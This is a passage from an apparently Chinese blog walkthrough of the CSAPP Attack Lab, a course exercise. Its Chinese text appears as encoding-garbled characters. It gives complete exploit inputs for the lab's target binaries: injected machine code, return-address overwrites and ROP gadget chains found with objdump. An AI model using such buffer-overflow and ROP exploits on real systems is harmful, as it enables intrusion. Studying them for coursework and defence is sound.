</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">Disassembly</span> <span class="n">of</span> <span class="n">section</span> <span class="p">.</span><span class="nl">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mo">0000000000000000</span> <span class="o">&lt;</span><span class="p">.</span><span class="n">text</span><span class="o">&gt;:</span>
</span></span><span class="line"><span class="cl">   <span class="mi">0</span><span class="o">:</span>   <span class="mi">48</span> <span class="n">c7</span> <span class="n">c7</span> <span class="n">a8</span> <span class="n">dc</span> <span class="mi">61</span> <span class="mi">55</span>    <span class="n">mov</span>    <span class="err">$</span><span class="mh">0x5561dca8</span><span class="p">,</span><span class="o">%</span><span class="n">rdi</span>
</span></span><span class="line"><span class="cl">   <span class="mi">7</span><span class="o">:</span>   <span class="mi">68</span> <span class="n">fa</span> <span class="mi">18</span> <span class="mi">40</span> <span class="mo">00</span>          <span class="n">pushq</span>  <span class="err">$</span><span class="mh">0x4018fa</span>
</span></span><span class="line"><span class="cl">   <span class="nl">c</span><span class="p">:</span>   <span class="n">c3</span>                      <span class="n">retq</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="æ ˆå¸§è®²è§£">æ ˆå¸§è®²è§£
</h3><p>æˆ‘ä»¬æœŸæœ›çš„æ ˆå¸§ä¸º</p>
<p><img src="https://pic4.zhimg.com/80/v2-dcd7fd081b2c60ed0443adfa044fbb27_1440w.webp"
	
	
	
	loading="lazy"
	
		alt="å›¾3"
	
	
></p>
<p>é€»è¾‘å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>getbuf</code>æ‰§è¡Œ<code>ret</code>ï¼Œä»æ ˆä¸­å¼¹å‡ºè¿”å›åœ°å€ï¼Œè·³è½¬åˆ°æˆ‘ä»¬æ³¨å…¥çš„ä»£ç </li>
<li>ä»£ç æ‰§è¡Œï¼Œå…ˆå°†å­˜åœ¨<code>caller</code>çš„æ ˆä¸­çš„å­—ç¬¦ä¸²ä¼ ç»™å‚æ•°å¯„å­˜å™¨<code>%rdi</code>ï¼Œå†å°†<code>touch3</code>çš„åœ°å€å‹å…¥æ ˆä¸­</li>
<li>ä»£ç æ‰§è¡Œ<code>ret</code>ï¼Œä»æ ˆä¸­å¼¹å‡º<code>touch3</code>æŒ‡ä»¤ï¼ŒæˆåŠŸè·³è½¬</li>
</ul>
<h3 id="solution">Solution
</h3><p>cookie<code>0x59b997fa</code>ä½œä¸ºå­—ç¬¦ä¸²è½¬æ¢ä¸º<code>ASCII</code>ä¸ºï¼š<code>35 39 62 39 39 37 66 61</code></p>
<p>æ³¨å…¥ä»£ç æ®µçš„åœ°å€ä¸ä¸Šé¢˜ä¸€æ ·ï¼ŒåŒæ ·ä¸º<code>0x5561dc78</code></p>
<p>ç”±äºåœ¨<code>test</code>æ ˆå¸§ä¸­å¤šåˆ©ç”¨äº†ä¸€ä¸ªå­—èŠ‚å­˜æ”¾cookieï¼Œæ‰€ä»¥æœ¬é¢˜è¦è¾“å…¥56ä¸ªå­—èŠ‚ã€‚æ³¨å…¥ä»£ç çš„å­—èŠ‚è¡¨ç¤ºæ”¾åœ¨å¼€å¤´ï¼Œ33-40ä¸ªå­—èŠ‚æ”¾ç½®æ³¨å…¥ä»£ç çš„åœ°å€ç”¨æ¥è¦†ç›–è¿”å›åœ°å€ï¼Œæœ€åå…«ä¸ªå­—èŠ‚å­˜æ”¾cookieçš„<code>ASCII</code> ã€‚äºæ˜¯å¾—åˆ°å¦‚ä¸‹è¾“å…¥ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">48</span> <span class="n">c7</span> <span class="n">c7</span> <span class="n">a8</span> <span class="n">dc</span> <span class="mi">61</span> <span class="mi">55</span> <span class="mi">68</span> 
</span></span><span class="line"><span class="cl"><span class="n">fa</span> <span class="mi">18</span> <span class="mi">40</span> <span class="mo">00</span> <span class="n">c3</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
</span></span><span class="line"><span class="cl"><span class="mi">78</span> <span class="n">dc</span> <span class="mi">61</span> <span class="mi">55</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
</span></span><span class="line"><span class="cl"><span class="mi">35</span> <span class="mi">39</span> <span class="mi">62</span> <span class="mi">39</span> <span class="mi">39</span> <span class="mi">37</span> <span class="mi">66</span> <span class="mi">61</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://pic3.zhimg.com/80/v2-02b3d0c6b65d967b6c66cbbc2ec0d2de_1440w.webp"
	
	
	
	loading="lazy"
	
		alt="å›¾4"
	
	
></p>
<p><strong>æ”»å‡»æˆåŠŸï¼</strong></p>
<h2 id="part-iireturn-oriented-programing">Part II:Return-Oriented Programing
</h2><p>åœ¨ç¬¬äºŒéƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬è¦æ”»å‡»çš„æ˜¯rtargetï¼Œä»–çš„ä»£ç å†…å®¹å’Œç¬¬ä¸€éƒ¨åˆ†ä¸€è‡´ï¼Œä½†é‡‡ç”¨äº†ä¸¤ç§ç­–ç•¥æ¥é˜»æ­¢ç¼“å†²åŒºæº¢å‡ºæ”»å‡»</p>
<ul>
<li>æ ˆéšæœºåŒ–
<ul>
<li>è¿™æ®µç¨‹åºåˆ†é…çš„æ ˆçš„ä½ç½®æ­£æ¯æ¬¡è¿è¡Œæ—¶éƒ½æ˜¯éšæœºçš„ï¼Œè¿™å°±ä½¿æˆ‘ä»¬æ— æ³•ç¡®å®šåœ¨å“ªé‡Œæ’å…¥ä»£ç </li>
</ul>
</li>
<li>é™åˆ¶å¯æ‰§è¡Œä»£ç åŒºåŸŸ
<ul>
<li>ä¹Ÿå°±æ˜¯å­˜æ”¾åœ¨æ ˆä¸Šçš„ä»£ç ä¸å¯æ‰§è¡Œï¼Œä½¿å¾—æ’å…¥çš„æ¶æ„ä»£ç æ— æ³•æ‰§è¡Œ</li>
</ul>
</li>
</ul>
<p>é’ˆå¯¹è¿™äº›é˜²å¾¡æªæ–½ï¼Œæ–‡æ¡£æä¾›äº†æ”»å‡»ç­–ç•¥ï¼Œå³<strong>ROPï¼šé¢å‘è¿”å›çš„ç¨‹åºè®¾è®¡</strong>ï¼Œå°±æ˜¯åœ¨å·²ç»å­˜åœ¨çš„ç¨‹åºä¸­æ‰¾åˆ°ç‰¹å®šçš„ä»¥<code>ret</code>ç»“å°¾çš„æŒ‡ä»¤åºåˆ—ä¸ºæˆ‘ä»¬æ‰€ç”¨ï¼Œç§°è¿™æ ·çš„ä»£ç æ®µä¸º<code>gadget</code>ï¼ŒæŠŠè¦ç”¨åˆ°éƒ¨åˆ†çš„åœ°å€å‹å…¥æ ˆä¸­ï¼Œæ¯æ¬¡<code>ret</code>ååˆä¼šå–å‡ºä¸€ä¸ªæ–°çš„<code>gadget</code>ï¼Œäºæ˜¯è¿™æ ·å°±èƒ½å½¢æˆä¸€ä¸ªç¨‹åºé“¾ï¼Œå®ç°æˆ‘ä»¬çš„ç›®çš„ã€‚<strong>æˆ‘å–œæ¬¢å°†è¿™ç§æ”»å‡»æ–¹å¼ç§°ä½œâ€œå°±åœ°å–æï¼Œæ‹¼å‡‘ä»£ç â€</strong>ã€‚</p>
<p><img src="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165336733.png"
	width="1029"
	height="582"
	srcset="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165336733_hu7106984471997724594.png 480w, /en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165336733_hu16357492657825526984.png 1024w"
	loading="lazy"
	
		alt="å›¾5"
	
	
		class="gallery-image" 
		data-flex-grow="176"
		data-flex-basis="424px"
	
></p>
<p>åŒæ—¶ä¹Ÿç»™å‡ºæŒ‡ä»¤ç¼–ç è¡¨</p>
<p><img src="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165427601.png"
	width="1117"
	height="1141"
	srcset="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165427601_hu3870573879609345137.png 480w, /en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/image-20240224165427601_hu11996603093128378326.png 1024w"
	loading="lazy"
	
		alt="å›¾6"
	
	
		class="gallery-image" 
		data-flex-grow="97"
		data-flex-basis="234px"
	
></p>
<p><strong>ä¸¾ä¸ªä¾‹å­ï¼š</strong></p>
<p><code>rtarget</code>æœ‰è¿™æ ·ä¸€ä¸ªå‡½æ•°ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">setval_210</span><span class="p">(</span><span class="kt">unsigned</span> <span class="o">*</span><span class="n">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">3347663060U</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å®ƒçš„æ±‡ç¼–ä»£ç å­—èŠ‚çº§è¡¨ç¤ºä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mf">0000000000400f</span><span class="mi">15</span> <span class="o">&lt;</span><span class="n">setval_210</span><span class="o">&gt;:</span>
</span></span><span class="line"><span class="cl">    <span class="mf">400f</span><span class="mi">15</span><span class="o">:</span> <span class="n">c7</span> <span class="mo">07</span> <span class="n">d4</span> <span class="mi">48</span> <span class="mi">89</span> <span class="n">c7</span>   <span class="n">movl</span> <span class="err">$</span><span class="mh">0xc78948d4</span><span class="p">,(</span><span class="o">%</span><span class="n">rdi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="mf">400f</span><span class="mi">1</span><span class="nl">b</span><span class="p">:</span> <span class="n">c3</span>                  <span class="n">retq</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŸ¥è¡¨å¯çŸ¥ï¼Œå–å…¶ä¸­ä¸€éƒ¨åˆ†å­—èŠ‚åºåˆ— 48 89 c7 å°±è¡¨ç¤ºæŒ‡ä»¤<code>movq %rax, %rdi</code>ï¼Œè¿™æ•´å¥æŒ‡ä»¤çš„åœ°å€ä¸º<code>0x400f15</code>ï¼Œäºæ˜¯ä»<code>0x400f18</code>å¼€å§‹çš„ä»£ç å°±å¯ä»¥å˜æˆä¸‹é¢è¿™æ ·ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span> <span class="o">%</span><span class="n">rax</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä¸ªå°ç‰‡æ®µå°±å¯ä»¥ä½œä¸ºä¸€ä¸ª<code>gadget</code>ä¸ºæˆ‘ä»¬æ‰€ç”¨ã€‚</p>
<p>å…¶å®ƒä¸€äº›å¯ä»¥åˆ©ç”¨çš„ä»£ç éƒ½åœ¨æ–‡ä»¶<code>farm.c</code>ä¸­å±•ç¤ºäº†å‡ºæ¥</p>
<h3 id="level1">level1
</h3><p>æœ¬é¢˜çš„ä»»åŠ¡å’Œphase2ç›¸åŒï¼Œéƒ½æ˜¯è¦æ±‚è¿”å›åˆ°touch2å‡½æ•°ï¼Œphase2ä¸­ç”¨åˆ°çš„æ³¨å…¥ä»£ç ä¸º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span>    <span class="err">$</span><span class="mh">0x59b997fa</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
</span></span><span class="line"><span class="cl"><span class="n">pushq</span>   <span class="err">$</span><span class="mh">0x4017ec</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç”±äºæˆ‘ä»¬æ— æ³•æ‰¾åˆ°è¿™ä¸ªç‰¹å®šå€¼çš„gadgetï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆå°†æˆ‘ä»¬éœ€è¦çš„å€¼å†™å…¥æ ˆä¸­ï¼Œå†åˆ©ç”¨popå‘½ä»¤å°†å…¶popåˆ°rdiå¯„å­˜å™¨ä¸­ï¼Œæœ€åå†è¿”å›touch2çš„å‡½æ•°èµ·å§‹åœ°å€ï¼Œä»»åŠ¡ä¾¿å®Œæˆã€‚</p>
<p>ä½†æ˜¯farmä¸­æ‰¾ä¸åˆ°popåˆ°rdiå¯„å­˜å™¨æŒ‡ä»¤çš„gadgetï¼Œæ‰€ä»¥æˆ‘ä»¬å¦è¾Ÿè¹Šå¾„ï¼Œå…ˆpopåˆ°raxä¸­ï¼Œå†mov %raxï¼Œ%rdiï¼Œå³</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">popq</span> <span class="o">%</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span><span class="line"><span class="cl"><span class="cp">#############
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">mov</span> <span class="o">%</span><span class="n">rax</span><span class="p">,</span><span class="o">%</span><span class="n">rdi</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-13869934030a0538ae7f1e4a6ab42202_1440w.webp"
	width="1241"
	height="726"
	srcset="/en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-13869934030a0538ae7f1e4a6ab42202_1440w_hu2488226402346328207.webp 480w, /en/p/csappattack%E5%AE%9E%E9%AA%8C/assets/v2-13869934030a0538ae7f1e4a6ab42202_1440w_hu10118464121499149602.webp 1024w"
	loading="lazy"
	
		alt="å›¾7"
	
	
		class="gallery-image" 
		data-flex-grow="170"
		data-flex-basis="410px"
	
></p>
<p>é€»è¾‘å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>getbuf</code>æ‰§è¡Œ<code>ret</code>ï¼Œä»æ ˆä¸­å¼¹å‡ºè¿”å›åœ°å€ï¼Œè·³è½¬åˆ°æˆ‘ä»¬çš„<code>gadget01</code></li>
<li><code>gadget01</code>æ‰§è¡Œï¼Œå°†<code>cookie</code>å¼¹å‡ºï¼Œèµ‹å€¼ç»™<code>%rax</code>ï¼Œç„¶åæ‰§è¡Œ<code>ret</code>ï¼Œç»§ç»­å¼¹å‡ºè¿”å›åœ°å€ï¼Œè·³è½¬åˆ°<code>gadget2</code></li>
<li><code>gadget2</code>æ‰§è¡Œï¼Œå°†<code>cookie</code>å€¼æˆåŠŸèµ‹å€¼ç»™å‚æ•°å¯„å­˜å™¨<code>%rdi</code>ï¼Œç„¶åæ‰§è¡Œ<code>ret</code>ï¼Œç»§ç»­å¼¹å‡ºè¿”å›åœ°å€ï¼Œè·³è½¬åˆ°<code>touch2</code></li>
</ul>
<h3 id="solution-1">Solution
</h3><p>é¦–è¦é—®é¢˜æ˜¯æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„<code>gadget</code></p>
<p>å…ˆç”¨å¦‚ä¸‹æŒ‡ä»¤å¾—åˆ°<code>target</code>çš„æ±‡ç¼–ä»£ç åŠå­—èŠ‚çº§è¡¨ç¤º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">objdump -d rtarget &gt; rtarget.s
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŸ¥è¡¨çŸ¥ï¼Œ<code>pop %rax</code>ç”¨<code>58</code>è¡¨ç¤ºï¼Œäºæ˜¯æŸ¥æ‰¾<code>58</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">0000000000401</span><span class="mi">9</span><span class="n">a7</span> <span class="o">&lt;</span><span class="n">addval_219</span><span class="o">&gt;:</span>
</span></span><span class="line"><span class="cl">  <span class="mi">4019</span><span class="nl">a7</span><span class="p">:</span>       <span class="mi">8</span><span class="n">d</span> <span class="mi">87</span> <span class="mi">51</span> <span class="mi">73</span> <span class="mi">58</span> <span class="mi">90</span>       <span class="n">lea</span>    <span class="o">-</span><span class="mh">0x6fa78caf</span><span class="p">(</span><span class="o">%</span><span class="n">rdi</span><span class="p">),</span><span class="o">%</span><span class="n">eax</span>
</span></span><span class="line"><span class="cl">  <span class="mi">4019</span><span class="nl">ad</span><span class="p">:</span>       <span class="n">c3</span>                      <span class="n">retq</span>                   <span class="n">retq</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¾—åˆ°æŒ‡ä»¤åœ°å€ä¸º<code>0x4019ab</code></p>
<p><code>movq %rax, %rdi</code>è¡¨ç¤ºä¸º<code>48 89 c7</code>ï¼Œåˆšå¥½èƒ½æ‰¾åˆ°ï¼å…¶ä¸­ 90 è¡¨ç¤ºâ€œç©ºâ€ï¼Œå¯ä»¥å¿½ç•¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">0000000000401</span><span class="mi">9</span><span class="n">c3</span> <span class="o">&lt;</span><span class="n">setval_426</span><span class="o">&gt;:</span>
</span></span><span class="line"><span class="cl">  <span class="mi">4019</span><span class="nl">c3</span><span class="p">:</span>       <span class="n">c7</span> <span class="mo">07</span> <span class="mi">48</span> <span class="mi">89</span> <span class="n">c7</span> <span class="mi">90</span>       <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x90c78948</span><span class="p">,(</span><span class="o">%</span><span class="n">rdi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="mi">4019</span><span class="nl">c9</span><span class="p">:</span>       <span class="n">c3</span>                      <span class="n">retq</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¾—åˆ°æŒ‡ä»¤åœ°å€ä¸º<code>0x4019c5</code></p>
<p>æ ¹æ®ä¸Šå›¾çš„æ ˆå¸§ï¼Œå°±èƒ½å†™å‡ºè¾“å…¥åºåˆ—ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">00 00 00 00 00 00 00 00
</span></span><span class="line"><span class="cl">ab 19 40 00 00 00 00 00
</span></span><span class="line"><span class="cl">fa 97 b9 59 00 00 00 00
</span></span><span class="line"><span class="cl">c5 19 40 00 00 00 00 00
</span></span><span class="line"><span class="cl">ec 17 40 00 00 00 00 00
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="level2">level2
</h3><p>æ¥è‡ªå®˜æ–¹çš„åŠé€€å“ˆå“ˆå“ˆï¼ŒBefore you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. Thatâ€™s a good score. If you have other pressing obligations consider stopping right now. Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.</p>
<p>è¿™é“é¢˜ä¸»è¦æ˜¯åœ¨rtargetä¸­è¿”å›åˆ°touch3ï¼Œçœ‹ä¼¼æ²¡æœ‰éš¾åº¦</p>
<p><code>Phase 3</code>ä¸­ç”¨åˆ°çš„æ³¨å…¥ä»£ç ä¸ºï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span>    <span class="err">$</span><span class="mh">0x5561dca8</span><span class="p">,</span> <span class="o">%</span><span class="n">rdi</span>
</span></span><span class="line"><span class="cl"><span class="n">pushq</span>   <span class="err">$</span><span class="mh">0x4018fa</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…¶ä¸­<code>0x5561dca8</code>æ˜¯æ ˆä¸­<code>cookie</code>å­˜æ”¾çš„åœ°å€ã€‚</p>
<p>åœ¨æœ¬é¢˜ä¸­ç”±äºæ ˆéšæœºåŒ–ï¼Œä¸èƒ½ç›´æ¥å°†<code>0x5561dca8</code>åœ°å€ç›´æ¥ç»™%rdiï¼Œå¯ä»¥åˆ©ç”¨%rspçš„ç›¸å¯¹åç§»é‡æ¥è·å–cookieçš„å­˜æ”¾åœ°å€ï¼Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">movq   $0x30(%rsp), %rdi
</span></span><span class="line"><span class="cl">movq   %rsp, %rax
</span></span><span class="line"><span class="cl">movq   %rax, %rdi
</span></span><span class="line"><span class="cl">lea    (%rdi,%rsi,1),%rax
</span></span><span class="line"><span class="cl">movq   %rax, %rdi
</span></span><span class="line"><span class="cl">movl   %eax, %edi
</span></span><span class="line"><span class="cl">movl   %eax, %edx
</span></span><span class="line"><span class="cl">movl   %esp, %eax
</span></span><span class="line"><span class="cl">movl   %ecx, %esi
</span></span><span class="line"><span class="cl">pushq   $0x4018fa
</span></span><span class="line"><span class="cl">ret
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŸ¥è¡¨ï¼Œ<code>movq %rsp, xxx</code>è¡¨ç¤ºä¸º<code>48 89 xx</code>ï¼ŒæŸ¥æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰å¯ç”¨çš„<code>gadget</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">0000000000401</span><span class="n">aab</span> <span class="o">&lt;</span><span class="n">setval_350</span><span class="o">&gt;:</span>
</span></span><span class="line"><span class="cl">  <span class="mi">401</span><span class="nl">aab</span><span class="p">:</span>       <span class="n">c7</span> <span class="mo">07</span> <span class="mi">48</span> <span class="mi">89</span> <span class="n">e0</span> <span class="mi">90</span>       <span class="n">movl</span>   <span class="err">$</span><span class="mh">0x90e08948</span><span class="p">,(</span><span class="o">%</span><span class="n">rdi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="mi">401</span><span class="nl">ab1</span><span class="p">:</span>       <span class="n">c3</span>                      <span class="n">retq</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿˜çœŸæ‰¾åˆ°äº†ï¼Œ<code>48 89 e0</code>å¯¹åº”çš„æ±‡ç¼–ä»£ç ä¸º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">movq</span> <span class="o">%</span><span class="n">rsp</span><span class="p">,</span> <span class="o">%</span><span class="n">rax</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ°å€ä¸ºï¼š<code>0x401aad</code></p>
<p>æ ¹æ®æç¤ºï¼Œæœ‰ä¸€ä¸ª<code>gadget</code>ä¸€å®šè¦ç”¨ä¸Š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">0000000000401</span><span class="mi">9</span><span class="n">d6</span> <span class="o">&lt;</span><span class="n">add_xy</span><span class="o">&gt;:</span>
</span></span><span class="line"><span class="cl">   <span class="mi">4019</span><span class="nl">d6</span><span class="p">:</span>       <span class="mi">48</span> <span class="mi">8</span><span class="n">d</span> <span class="mo">04</span> <span class="mi">37</span>             <span class="nf">lea</span>    <span class="p">(</span><span class="o">%</span><span class="n">rdi</span><span class="p">,</span><span class="o">%</span><span class="n">rsi</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="o">%</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl">   <span class="mi">4019</span><span class="nl">da</span><span class="p">:</span>       <span class="n">c3</span>                      <span class="n">retq</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ°å€ä¸ºï¼š<code>0x4019d6</code></p>
<p>é€šè¿‡åˆé€‚çš„èµ‹å€¼ï¼Œè¿™æ®µä»£ç å°±èƒ½å®ç°<code>%rsp</code>åŠ ä¸Šæ®µå†…åç§»åœ°å€æ¥ç¡®å®š<code>cookie</code>çš„ä½ç½®</p>
<p>å‰©ä¸‹éƒ¨åˆ†æµç¨‹ä¸<code>Phase 3</code>ä¸€è‡´ï¼Œå¤§ä½“æ€è·¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>å…ˆå–å¾—æ ˆé¡¶æŒ‡é’ˆçš„ä½ç½®</li>
<li>å–å‡ºå­˜åœ¨æ ˆä¸­å¾—åç§»é‡çš„å€¼</li>
<li>é€šè¿‡<code>lea (%rdi,%rsi,1),%rax</code>å¾—åˆ° cookie çš„åœ°å€</li>
<li>å°† cookie çš„åœ°å€ä¼ ç»™<code>%rdi</code></li>
<li>è°ƒç”¨<code>touch 3</code></li>
</ul>
